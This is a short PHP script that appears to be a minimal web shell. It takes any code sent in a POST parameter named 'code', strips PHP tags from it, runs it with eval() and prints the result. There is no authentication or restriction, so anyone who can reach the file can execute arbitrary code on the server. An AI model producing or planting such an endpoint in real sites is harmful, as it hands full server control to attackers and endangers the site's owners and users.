<?php
if(isset($_POST['code'])&& $_POST['code'])
{
    // Filter Some Chars we dont need
    $code = str_replace("<?php","",$_POST['code']);
    $code = str_replace("<?","",$code);
    $code = str_replace("?>","",$code);

    // Evaluate PHP CoDE!
    echo htmlspecialchars(eval($code));
}	
?>